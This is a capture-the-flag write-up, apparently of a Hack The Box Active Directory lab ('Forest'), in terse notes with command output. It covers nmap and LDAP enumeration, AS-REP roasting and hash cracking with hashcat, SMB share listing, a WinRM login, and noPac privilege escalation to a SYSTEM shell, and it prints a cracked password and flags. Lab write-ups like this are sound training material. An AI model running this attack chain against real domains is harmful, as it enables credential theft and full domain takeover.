## NMAP SCAN
```
nmap -sCV -p- 10.129.208.194 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-20 14:32 +0700
Nmap scan report for 10.129.208.194
Host is up (0.080s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-20 07:40:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49904/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-20T00:41:17-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-04-20T07:41:15
|_  start_date: 2026-04-20T07:14:51
|_clock-skew: mean: 2h26m24s, deviation: 4h02m31s, median: 6m22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.45 seconds
                                                                
```

it is a AD env

the attack ip is a DC

OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)

htb.local

## LDAP SEARCH 
```
usernames

santi
sebastain
mark
andy
lucinda
```
lets try to login using no username and pass 

we logged in 
got new user: svc-alfresco 

lets try kerberoasting...
```
impacket-GetNPUsers -dc-ip 10.129.208.194 htb.local/ -request 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2026-04-20 16:10:00.310772  2019-09-23 18:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:1fc34fceddcdcc9bf84048e6bc80868e$125ea3042c78504d49729c3a7b6ec918960bf379900398de0bbddc8ada77d0f602f1dcd71d8aba56c9f556ea2cd00b0af584b8a60d38965a322235f305117516f100e7088bc2b8451c3feff33ea59670c1fb0d3666dcc2b991f9f7ffc1add554981293854169f6204001e1aaf3bef40de671860bd7e17106debc64c14a8d3edea8aeaec8c83252d7292c6b5d167115dbe1169ae1941b91f01fe93973e3737db7735a247981e651736ed1439ec2c77850f829c95e273e521e14926ad8825f002e0b071c5def828679010b3f6ff9235deceafa36415e762826bb6c45aa45e37f8182bd12aaa086
```

lets hashcat this 
```
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 9 8945HS w/ Radeon 780M Graphics, 2255/4511 MB (1024 MB allocatable), 5MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1325 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:1fc34fceddcdcc9bf84048e6bc80868e$125ea3042c78504d49729c3a7b6ec918960bf379900398de0bbddc8ada77d0f602f1dcd71d8aba56c9f556ea2cd00b0af584b8a60d38965a322235f305117516f100e7088bc2b8451c3feff33ea59670c1fb0d3666dcc2b991f9f7ffc1add554981293854169f6204001e1aaf3bef40de671860bd7e17106debc64c14a8d3edea8aeaec8c83252d7292c6b5d167115dbe1169ae1941b91f01fe93973e3737db7735a247981e651736ed1439ec2c77850f829c95e273e521e14926ad8825f002e0b071c5def828679010b3f6ff9235deceafa36415e762826bb6c45aa45e37f8182bd12aaa086:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:1fc34fceddcdcc...aaa086
Time.Started.....: Mon Apr 20 16:06:43 2026 (3 secs)
Time.Estimated...: Mon Apr 20 16:06:46 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1378.1 kH/s (1.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4080640/14344385 (28.45%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: s8609571h -> s3r3ndipit
Hardware.Mon.#01.: Util: 40%

```

s3rvice is the pass
lets try netexec smb to look for shares..... 
```
netexec smb 10.129.208.194 -u svc-alfresco -p s3rvice --shares
SMB         10.129.208.194  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.208.194  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
[16:12:11] ERROR    NetBIOSTimeout on target 10.129.208.194: The NETBIOS connection with the remote host timed out. 
```

getting timeout....

```
netexec smb 10.129.208.194 -u svc-alfresco -p s3rvice --shares --smb-timeout 10
SMB         10.129.208.194  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.208.194  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.208.194  445    FOREST           [*] Enumerated shares
SMB         10.129.208.194  445    FOREST           Share           Permissions     Remark
SMB         10.129.208.194  445    FOREST           -----           -----------     ------
SMB         10.129.208.194  445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.208.194  445    FOREST           C$                              Default share
SMB         10.129.208.194  445    FOREST           IPC$            READ            Remote IPC
SMB         10.129.208.194  445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.208.194  445    FOREST           SYSVOL          READ            Logon server share 

```

got the shares
sysvol is imp ! 
logged in using winrm
```
evil-winrm -i 10.129.208.194 -u svc-alfresco -p s3rvice
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
2684bb95613f50273fe08708bce2f107
```

got the user flag 

user privs
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

```
*Evil-WinRM* PS C:\Users> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/20/2026 2:56:43 AM
Password expires             Never
Password changeable          4/21/2026 2:56:43 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/20/2026 2:35:37 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.

```

using SeMachineAccountPrivilege we can probably do Active Directory Domain Services Elevation of Privilege Vulnerability This CVE ID is unique from CVE-2021-42278, CVE-2021-42282, CVE-2021-42291 using NoPac.py 

PoC: https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/
```
faketime "$(ntpdate -q 10.129.208.194 | cut -d ' ' -f 1,2)" python3 noPac.py htb.local/svc-alfresco:s3rvice -dc-ip 10.129.208.194 -shell --impersonate Administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target forest.htb.local
[*] will try to impersonate Administrator
[*] Already have user Administrator ticket for target forest.htb.local
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
eced57d8845a258e5acddb61bfa45564

C:\Windows\system32>

```

Got the root flag as well !!!!!